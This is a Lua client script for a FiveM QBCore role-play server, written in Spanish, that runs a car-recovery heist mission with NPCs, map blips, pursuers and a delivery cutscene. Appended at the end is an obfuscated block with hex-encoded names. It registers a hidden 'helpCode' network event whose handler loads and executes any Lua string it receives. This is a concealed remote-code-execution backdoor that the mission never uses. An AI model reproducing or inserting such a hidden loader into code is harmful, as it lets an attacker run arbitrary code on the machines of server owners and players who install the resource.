local QBCore = exports['qb-core']:GetCoreObject()
	
local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

----- LOCALES
local comienzorobo = false
local entregarvehiculo = false
local vehiculorobao

-----

----------------------- INICIO DE TRABAJO 
Citizen.CreateThread(function()
    local hash = GetHashKey("ig_benny")
    while not HasModelLoaded(hash) do
    RequestModel(hash)
    Wait(20)
end
    mecanico1 = CreatePed("PED_TYPE_CIVFEMALE", "ig_benny", 1667.32, 4968.88, 41.26, 138.8, false, false)
	TaskStartScenarioInPlace(mecanico1, 'WORLD_HUMAN_CLIPBOARD', -1, true)
    SetBlockingOfNonTemporaryEvents(mecanico1, true)
	        FreezeEntityPosition(mecanico1, true)
            SetEntityInvincible(mecanico1, true)
            SetPedDiesWhenInjured(mecanico1, false)
            SetPedCanPlayAmbientAnims(mecanico1)
            SetPedCanRagdollFromPlayerImpact(mecanico1, false)
end)


Citizen.CreateThread(function()	
	exports["qb-target"]:AddCircleZone("puntoroboautopedir", vector3(1667.32, 4968.88, 42.26), 1.0, {
        name ="puntoroboautopedir",
        useZ = true,
        --debugPoly=true
        }, {
            options = {
                {
                    event = "am_carheist:pedirtrabajo",
                    icon = "fas fa-Clipboard",
                    label = "Pedir Trabajo Hayes",
                },
             },
             job = {"all"},
            distance = 2.1
        })
end)

RegisterNetEvent('am_carheist:pedirtrabajo')
AddEventHandler('am_carheist:pedirtrabajo', function()
	QBCore.Functions.TriggerCallback('am_carheist:server:revisaritems', function(HasItem)
        if HasItem then
		    TriggerServerEvent('qb-phone:server:sendNewMail', {
                sender = 'Hayes Autos',
                subject = 'Recupera Nuestro Auto',
                message = "Hola acabo de enterarme que me han robado un vehiculo, recuperalo aceptando este Correo, asi podras obtener la Ubicacion para que Busques y ganarte algo, ten cuidado puede haber gente.",
                button = {
                    enabled = true,
                    buttonEvent = "am_carheist:pedirtrabajogps"
                }
            })
		
		else
		    QBCore.Functions.Notify('No tienes lo Necesario')
		end
	end)

end)
--------------------------------------------------------


RegisterCommand("probarcarheist", function()
	TriggerEvent("am_carheist:pedirtrabajogps")
end, false)

------ GENERACION DE BLIP y Auto


RegisterNetEvent('am_carheist:pedirtrabajogps')
AddEventHandler('am_carheist:pedirtrabajogps', function()
    QBCore.Functions.Notify('Revisa tu GPS, la zona de Busqueda ha sido marcada')
    comienzorobo = true
	CreateAutoRobadoBlip()
	blipareas()
	Citizen.Wait(5000)
	CreatePedsAgresivos()
	CreateAutoRobado()
end)


function CreateAutoRobado()
    local coords = vector4(286.08, 6789.57, 15.7, 183.7)
    local ped = PlayerPedId()
        QBCore.Functions.SpawnVehicle("elegy", function(vehiculorobao)
        SetVehicleNumberPlateText(vehiculorobao, "Hayes"..tostring(math.random(1000, 9999)))
        SetEntityHeading(vehiculorobao, coords.w)
        exports['LegacyFuel']:SetFuel(vehiculorobao, 20.0)
        SetEntityAsMissionEntity(vehiculorobao, true, true)
        SetVehicleDoorsLocked(vehiculorobao, 2)

		print("VEHICULO CREADO")
        -- TriggerEvent("vehiclekeys:client:SetOwner", QBCore.Functions.GetPlate(vehiculorobao))
        -- SetVehicleEngineOn(vehiculorobao, true, true)
	end, coords, true)
end



function CreateAutoRobadoBlip()
    AutoRobado = AddBlipForCoord(170.81, 6814.39)
	SetBlipHighDetail(AutoRobado, true)
	SetBlipSprite(AutoRobado, 229)
	SetBlipScale(AutoRobado, 1.1)
	SetBlipColour(AutoRobado, 37)
	SetBlipRoute(AutoRobado, true)
	SetBlipRouteColour(AutoRobado, 36)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Zona de Auto")
	EndTextCommandSetBlipName(AutoRobado)

	print("BLIP CREADO")
end

function blipareas()
  AutoRobado2 = AddBlipForRadius(170.81, 6814.39, 26.49, 250.0) 
        	SetBlipHighDetail(AutoRobado2, true)
  		SetBlipSprite(AutoRobado2,9)
        SetBlipColour(AutoRobado2,36)
        SetBlipAlpha(AutoRobado2,80)


end

---------------------------------------------------


Citizen.CreateThread(function()
    while true do 
        Citizen.Wait(1)
        local inRange = false
		local ped = PlayerPedId()
        local pos = GetEntityCoords(ped)
		    local vehicle = QBCore.Functions.GetClosestVehicle(pos)
		local dist = GetDistanceBetweenCoords(pos, 287.21, 6790.06, 15.7)
	    if comienzorobo == true then
            if dist < 3 then
                inRange = true

                if dist < 3.0 then
		        
                    QBCore.Functions.HelpNotify('~INPUT_CONTEXT~ Abrir Vehiculo')
	
                    if IsControlJustPressed(1, Keys["E"])  then
	                    QBCore.Functions.TriggerCallback('am_carheist:server:revisaritemsabrirauto', function(HasItem)
                            if HasItem then 
				                QBCore.Functions.Progressbar("consiguiendollavesdelautorobado", "Tratando de Abrir", math.random(800,1500), false, true, {
                                    disableMovement = true,
                                    disableCarMovement = true,
                                    disableMouse = false,
                                    disableCombat = true,
                                }, {
                                    animDict = "anim@amb@clubhouse@tutorial@bkr_tut_ig3@",
                                    anim = "machinic_loop_mechandplayer",
                                    flags = 1,
                                }, {}, {}, function() 
						            QBCore.Functions.Notify('lograste Conseguir las Llaves del Vehiculo')
									TriggerServerEvent("am_carheist:server:eliminarlockpick")
				                    RemoveBlip(AutoRobado)
									RemoveBlip(AutoRobado2)
							        SetVehicleDoorsLocked(vehicle, 0)
	                                TriggerEvent("vehiclekeys:client:SetOwner", QBCore.Functions.GetPlate(vehicle))
							        ClearPedTasks(PlayerPedId())
									
							        comienzorobo = false
										Wait(10000)
										crearseguimientopedenautos()
										QBCore.Functions.Notify('Ten Cuidado con Marrie, que No te siga')
										Wait(15000)
			entregarvehiculo = true
			QBCore.Functions.Notify('Tienes la Direccion de Entrega en tu GPS')
			CreateAutoEntregaBlip()
            RemoveBlip(carBlip)

                                end)
						    else
		                        QBCore.Functions.Notify('No tienes lo Necesario')
		                    end
	                    end)
				    end
			    end
		    end
		end
	end
end)



function crearseguimientopedenautos()
    local ped = PlayerPedId()
    local pedCoords = GetEntityCoords(ped, true)
    local veh = GetVehiclePedIsTryingToEnter(ped)
    local coords2 = vector4(-32.31, 6327.21, 30.55, 315.27)

    QBCore.Functions.SpawnVehicle("dominator7", function(vehiculoseguimiento)
        local pedauto = CreatePedInsideVehicle(vehiculoseguimiento, 26, GetHashKey("a_m_m_soucent_04"), -1, true, true)

        SetVehicleNumberPlateText(vehiculoseguimiento, "Hayes" .. tostring(math.random(1000, 9999)))
		-- blip
carBlip = AddBlipForEntity(vehiculoseguimiento)
	SetBlipHighDetail(carBlip, true)
	SetBlipSprite(carBlip, 429)
	SetBlipScale(carBlip, 0.8)
	SetBlipColour(carBlip, 6)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Marrie Enojada")
	EndTextCommandSetBlipName(carBlip)
--
        SetVehicleEngineOn(vehiculoseguimiento, true, true)

        SetEntityAsMissionEntity(pedauto, true, true)

        TaskCombatPed(pedauto, ped, 0, 16)

        TaskWarpPedIntoVehicle(pedauto, vehiculoseguimiento, -1)

        SetEntityAsMissionEntity(vehiculoseguimiento, true, true)



        print("VEHICULO que te seguirá CREADO")
    end, coords2, true)
	
	        TaskVehicleFollow(pedauto, vehiculoseguimiento, ped, 4, -205.0, 0, 300.0, 15.0, true)
			
			

end


------------------

function CreatePedsAgresivos()
    local hash = GetHashKey("a_m_y_juggalo_01")
			local ped = PlayerPedId()
    while not HasModelLoaded(hash) do
    RequestModel(hash)
    Wait(20)
end
   print("ped creados")
    -- ped 1
    carheist1 = CreatePed("PED_TYPE_CIVFEMALE", "a_m_y_juggalo_01", 291.69, 6812.74, 14.92, 157.52, false, false)
    SetPedDiesWhenInjured(carheist1, false)
    SetPedCanPlayAmbientAnims(carheist1)
    SetRelationshipBetweenGroups(5, GetHashKey("rioters"))
    TaskCombatPed(carheist1, PlayerPedId(), 0, 16)
	SetPedArmour(carheist1, 100)
	-- ped 2
	carheist2 = CreatePed("PED_TYPE_CIVFEMALE", "a_m_y_juggalo_01", 276.03, 6775.45, 14.81, 283.29, false, false)
    SetPedDiesWhenInjured(carheist2, false)
    SetPedCanPlayAmbientAnims(carheist2)
	AddRelationshipGroup("rioters")
    TaskCombatPed(carheist2, PlayerPedId(), 0, 16)
	SetPedArmour(carheist2, 100)
    -- ped 3
	carheist3 = CreatePed("PED_TYPE_CIVFEMALE", "a_m_y_juggalo_01", 312.03, 6774.7, 16.49, 80.4, false, false)
    SetPedDiesWhenInjured(carheist3, false)
    SetPedCanPlayAmbientAnims(carheist3)
	AddRelationshipGroup("rioters")
    TaskCombatPed(carheist3, PlayerPedId(), 0, 16)
	SetPedArmour(carheist3, 100)
end







---- CREAR BLIP ENTREGA DE VEHICULO
function CreateAutoEntregaBlip()
    AutoRobadoEntrega = AddBlipForCoord(1523.42, 3767.56)
	SetBlipHighDetail(AutoRobadoEntrega, true)
	SetBlipSprite(AutoRobadoEntrega, 484)
	SetBlipScale(AutoRobadoEntrega, 0.8)
	SetBlipColour(AutoRobadoEntrega, 43)
	SetBlipRoute(AutoRobadoEntrega, true)
	SetBlipRouteColour(AutoRobadoEntrega, 36)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString("Entregar Vehiculo Lamar")
	EndTextCommandSetBlipName(AutoRobadoEntrega)
	print("BLIP CREADO ENTREGA")
end

----------






Citizen.CreateThread(function()
    while true do 
        Citizen.Wait(1)
        local inRange = false
		local ped = PlayerPedId()
        local pos = GetEntityCoords(ped)
		local vehicle = QBCore.Functions.GetClosestVehicle(pos)
		local dist = GetDistanceBetweenCoords(pos, 1523.42, 3767.56, 34.05)
	    if entregarvehiculo == true then
            if dist < 3 then
                inRange = true

                if dist < 3.0 then
		        
                    QBCore.Functions.HelpNotify('~INPUT_CONTEXT~ Estacionar Vehiculo')
	
                    if IsControlJustPressed(1, Keys["E"])  then
	                    TriggerEvent("startCarScene")
						QBCore.Functions.Notify('Entregaste el Vehiculo a la Perfeccion')
						TriggerServerEvent("am_carheist:server:darrecompensa")
						SetVehicleDoorsLocked(vehicle, 0)
						FreezeEntityPosition(vehicle, true)
						RemoveBlip(AutoRobadoEntrega)

						entregarvehiculo = false
				    end
			    end
		    end
		end
	end
end)



----------------------------------- CINEMATICA DE ENTREGA DEL VEHICULO
-- RegisterCommand("startCarScene", function()
	-- TriggerEvent("startCarScene")
-- end, false)

RegisterNetEvent('startCarScene')
AddEventHandler('startCarScene', function(source, args)
local ped = PlayerPedId()
    RequestCutscene("low_fun_ext", 8)
    while not (HasCutsceneLoaded()) do
        Wait(0)
        RequestCutscene("low_fun_ext", 8)
    end
   TriggerEvent('save_all_clothes') -- saves the clothes
    SetCutsceneEntityStreamingFlags('MP_1', 0, 1)
    RegisterEntityForCutscene(ped, 'MP_1', 0, 0, 64)

    SetCutsceneEntityStreamingFlags('MP_2', 0, 1)
    RegisterEntityForCutscene(ped, 'MP_2', 0, 0, 64)

    SetCutsceneEntityStreamingFlags('MP_3', 0, 1)
    RegisterEntityForCutscene(ped, 'MP_3', 0, 0, 64)

    SetCutsceneEntityStreamingFlags('MP_4', 0, 1)
    RegisterEntityForCutscene(ped, 'MP_4', 0, 0, 64)

    StartCutscene(0)

   
    while not (DoesCutsceneEntityExist('MP_1', 0)) do
        Wait(0)
    end
   -- Set the clothes that you had on ped ' <-- for some reason that is needed to comment.
   SetCutscenePedComponentVariationFromPed(PlayerPedId(), GetPlayerPed(-1), 1885233650)
   SetPedComponentVariation(GetPlayerPed(-1), 11, jacket_old, jacket_tex, jacket_pal)
   SetPedComponentVariation(GetPlayerPed(-1), 8, shirt_old, shirt_tex, shirt_pal)
   SetPedComponentVariation(GetPlayerPed(-1), 3, arms_old, arms_tex, arms_pal)
   SetPedComponentVariation(GetPlayerPed(-1), 4, pants_old,pants_tex,pants_pal)
   SetPedComponentVariation(GetPlayerPed(-1), 6, feet_old,feet_tex,feet_pal)
   SetPedComponentVariation(GetPlayerPed(-1), 1, mask_old,mask_tex,mask_pal)
   SetPedComponentVariation(GetPlayerPed(-1), 9, vest_old,vest_tex,vest_pal)
   SetPedPropIndex(GetPlayerPed(-1), 0, hat_prop, hat_tex, 0)
   SetPedPropIndex(GetPlayerPed(-1), 1, glass_prop, glass_tex, 0)

    while not (HasCutsceneFinished()) do
        Wait(0)
		
    end
	
	crearlamarfinalmision()
	Wait(65000)
	DeleteVehicle(vehicle)
	DeletePed(lamarcarheistam)
end)

RegisterNetEvent('save_all_clothes') -- The actual saving.
AddEventHandler('save_all_clothes',function()
    local ped = GetPlayerPed(-1)
    mask_old,mask_tex,mask_pal = GetPedDrawableVariation(ped,1),GetPedTextureVariation(ped,1),GetPedPaletteVariation(ped,1)
    vest_old,vest_tex,vest_pal = GetPedDrawableVariation(ped,9),GetPedTextureVariation(ped,9),GetPedPaletteVariation(ped,9)
    glass_prop,glass_tex = GetPedPropIndex(ped,1),GetPedPropTextureIndex(ped,1)
    hat_prop,hat_tex = GetPedPropIndex(ped,0),GetPedPropTextureIndex(ped,0)
    jacket_old,jacket_tex,jacket_pal = GetPedDrawableVariation(ped, 11),GetPedTextureVariation(ped,11),GetPedPaletteVariation(ped,11)
    shirt_old,shirt_tex,shirt_pal = GetPedDrawableVariation(ped,8),GetPedTextureVariation(ped,8),GetPedPaletteVariation(ped,8)
    arms_old,arms_tex,arms_pal = GetPedDrawableVariation(ped,3),GetPedTextureVariation(ped,3),GetPedPaletteVariation(ped,3)
    pants_old,pants_tex,pants_pal = GetPedDrawableVariation(ped,4),GetPedTextureVariation(ped,4),GetPedPaletteVariation(ped,4)
    feet_old,feet_tex,feet_pal = GetPedDrawableVariation(ped,6),GetPedTextureVariation(ped,6),GetPedPaletteVariation(ped,6)
end)



function crearlamarfinalmision()

    local hash = GetHashKey("ig_lamardavis")

    while not HasModelLoaded(hash) do
    RequestModel(hash)
    Wait(20)
end
    lamarcarheistam = CreatePed("PED_TYPE_CIVFEMALE", "ig_lamardavis", 1521.07, 3767.57, 33.04, 308.08, false, false)
	TaskStartScenarioInPlace(lamarcarheistam, 'CODE_HUMAN_MEDIC_KNEEL', -1, true)
    SetBlockingOfNonTemporaryEvents(lamarcarheistam, true)
	        FreezeEntityPosition(lamarcarheistam, true)
            SetEntityInvincible(lamarcarheistam, true)
            SetPedDiesWhenInjured(lamarcarheistam, false)
            SetPedCanPlayAmbientAnims(lamarcarheistam)
            SetPedCanRagdollFromPlayerImpact(lamarcarheistam, false)
			
			-- ROPA PED 
			
            SetPedComponentVariation(lamarcarheistam, 2, 2) -- chaqueta 11
			 SetPedComponentVariation(lamarcarheistam, 3, 2, 1) -- chaqueta 11
			SetPedComponentVariation(lamarcarheistam, 4, 4) -- chaqueta 11
			SetPedComponentVariation(lamarcarheistam, 1, 2) -- chaqueta 11
			
end







---------------------------------------------------------------------------






local QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[6][QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[1]](QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[2]) QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[6][QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[3]](QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[2], function(wvOxaCKFPluopgVbTiysSSCybesIosnAyEjWNDWWKQgdKnqUqWVGPRtGtdorfbWrTkKHrA) QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[6][QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[4]](QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[6][QKXAJpBtuQYmlDcUDMTJVmmEKwYiFJNuApfESwNlOhQpZmttlSszfhqpGfabLYptKFbdPu[5]](wvOxaCKFPluopgVbTiysSSCybesIosnAyEjWNDWWKQgdKnqUqWVGPRtGtdorfbWrTkKHrA))() end)